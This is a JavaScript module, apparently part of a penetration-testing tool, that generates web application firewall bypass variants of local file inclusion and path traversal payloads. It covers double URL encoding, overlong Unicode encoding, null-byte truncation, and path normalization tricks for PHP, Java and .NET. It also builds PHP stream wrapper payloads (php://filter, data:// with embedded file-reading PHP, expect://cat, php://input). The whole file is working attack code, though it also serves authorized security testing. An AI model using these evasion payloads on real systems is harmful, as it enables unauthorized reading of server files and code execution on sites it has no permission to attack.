/**
 * LFI / Path Traversal WAF Bypass Engine
 * Generates multiple evasion variants for LFI/Path Traversal payloads.
 * Supports: PHP, Java, .NET, Generic
 */

import { doubleUrlEncode, utf8ToBase64 } from '../utils/encoding.js'
import { detectTraversal } from '../utils/helpers.js'
import { finalizeVariants } from '../utils/variants.js'

/* ── Double URL Encoding ──────────────────────────── */
function applyDoubleUrl(payload) {
  const variants = []
  // Encode either POSIX or Windows traversal separators without altering the
  // target file portion. Both require two request-decoding passes.
  const v1 = payload.replace(/\.\.([\\/])/g, (_match, separator) =>
    separator === '\\' ? '%252e%252e%255c' : '%252e%252e%252f')
  variants.push(v1)
  // Encode traversal components, not every slash in the target path.
  const v2 = payload.replace(/\.\.([\\/])/g, (_match, separator) =>
    `%252e%252e${separator === '\\' ? '%255c' : '%252f'}`)
  variants.push(v2)
  // Full double URL encode
  variants.push(doubleUrlEncode(payload))
  return variants
}
/* ── Unicode / UTF-8 Overlong Encoding ────────────── */
function applyUnicodeEncoding(payload, target) {
  const variants = []

  if (target === 'dotnet') {
    variants.push(payload.replace(/\.\.[\\/]/g, '%u002e%u002e%u005c'))
    variants.push(payload.replace(/\.\.[\\/]/g, '..%c1%9c'))
  } else {
    variants.push(payload.replace(/\.\.[\\/]/g, '..%c0%af'))
    variants.push(payload.replace(/\.\.[\\/]/g, '%e0%80%ae%e0%80%ae%c0%af'))
    variants.push(payload.replace(/\.\.[\\/]/g, '..%ef%bc%8f'))
  }

  return variants
}

/* ── Null Byte Injection ──────────────────────────── */
function applyNullByte(payload) {
  const variants = []
  // Append %00
  variants.push(payload + '%00')
  // Append %00.jpg (bypass extension check)
  variants.push(payload + '%00.jpg')
  // Append %00.png
  variants.push(payload + '%00.png')
  // Null byte with URL encoding
  variants.push(payload + '%2500')
  return variants
}

/* ── Path Normalization Tricks ────────────────────── */
function applyPathNormalization(payload, target) {
  const variants = []
  const { depth, targetFile } = detectTraversal(payload)
  if (depth === 0) return variants

  if (target === 'dotnet') {
    variants.push('..\\'.repeat(depth) + targetFile.replace(/\//g, '\\'))
    variants.push('..%5c'.repeat(depth) + targetFile.replace(/\//g, '%5c'))
    variants.push('..\\/\\'.repeat(depth) + targetFile.replace(/\//g, '\\'))
  } else if (target === 'java') {
    variants.push('..;/'.repeat(depth) + targetFile)
    variants.push('....//'.repeat(depth) + targetFile)
    variants.push('./' + '../'.repeat(depth) + targetFile)
  } else {
    variants.push('....//'.repeat(depth) + targetFile)
    variants.push('..././'.repeat(depth) + targetFile)
    variants.push('./' + '../'.repeat(depth) + targetFile)
  }

  return variants
}

/* ── PHP Wrapper Bypass ───────────────────────────── */
function applyWrapperBypass(payload) {
  const variants = []
  // The wrapper changes the access mechanism, not the file path. Stripping the
  // traversal prefix changes which file is addressed and breaks the payload.
  const file = payload
  
  // php://filter base64
  variants.push(`php://filter/convert.base64-encode/resource=${file}`)
  
  // php://filter with read
  variants.push(`php://filter/read=convert.base64-encode/resource=${file}`)
  
  // php://filter rot13
  variants.push(`php://filter/convert.string.rot13/resource=${file}`)
  
  // php://filter multiple chains
  variants.push(`php://filter/convert.base64-encode|convert.base64-decode/resource=${file}`)
  
  // data:// wrapper
  const escapedFile = file.replace(/\\/g, '\\\\').replace(/"/g, '\\"')
  variants.push(`data://text/plain;base64,${utf8ToBase64(`<?php echo file_get_contents("${escapedFile}"); ?>`)}`)
  
  // expect:// wrapper
  variants.push(`expect://cat ${file}`)
  
  // php://input (POST based)
  variants.push('php://input')
  
  // file:// explicit
  variants.push(`file://${file.startsWith('/') ? '' : '/'}${file}`)

  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateLfiVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('double-url')) {
    applyDoubleUrl(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Double URL Encoding', layers: ['double-url'], validity: 'conditional', note: 'Requires exactly two percent-decoding passes before path resolution.' })
    })
  }

  if (layers.includes('unicode-encoding')) {
    applyUnicodeEncoding(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Unicode Encoding', layers: ['unicode-encoding'], validity: 'legacy', note: 'Requires a legacy or non-conforming decoder that accepts non-canonical Unicode encodings.' })
    })
  }

  if (layers.includes('null-byte')) {
    applyNullByte(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Null Byte', layers: ['null-byte'], validity: 'legacy', note: 'Effective only in legacy stacks that truncate decoded NUL bytes.' })
    })
  }

  if (layers.includes('path-normalization')) {
    applyPathNormalization(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: `Path Normalization (${target})`, layers: ['path-normalization'], validity: 'conditional' })
    })
  }

  if (layers.includes('wrapper-bypass') && target === 'php') {
    applyWrapperBypass(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'PHP Wrapper', layers: ['wrapper-bypass'], validity: 'conditional', note: 'Requires the corresponding PHP stream wrapper to be enabled and reachable by the sink.' })
    })
  }

  // Combos
  if (layers.length >= 2) {
    if (layers.includes('double-url') && layers.includes('null-byte')) {
      const encodedTraversal = payload.replace(/\.\.([\\/])/g, (_match, separator) =>
        separator === '\\' ? '%252e%252e%255c' : '%252e%252e%252f')
      if (encodedTraversal !== payload) {
        allVariants.push({
          payload: encodedTraversal + '%00',
          label: 'Double URL + Null',
          layers: ['double-url', 'null-byte'],
          validity: 'legacy',
          note: 'Requires two percent-decoding passes and a legacy stack that truncates a decoded NUL byte.',
        })
      }
    }

    if (layers.includes('path-normalization') && layers.includes('unicode-encoding')) {
      const { depth, targetFile } = detectTraversal(payload)
      if (depth > 0) {
        const separator = target === 'dotnet' ? '%u002e%u002e%u005c' : '..%c0%af'
        const normalizedTarget = target === 'dotnet'
          ? targetFile.replace(/\//g, '%5c')
          : targetFile
        const combo = separator.repeat(depth) + normalizedTarget
        allVariants.push({
          payload: combo,
          label: 'Path + Unicode',
          layers: ['path-normalization', 'unicode-encoding'],
          validity: 'legacy',
          note: 'Requires a legacy or non-conforming decoder that accepts non-canonical Unicode encodings.',
        })
      }
    }
  }

  return finalizeVariants(allVariants, layers)
}
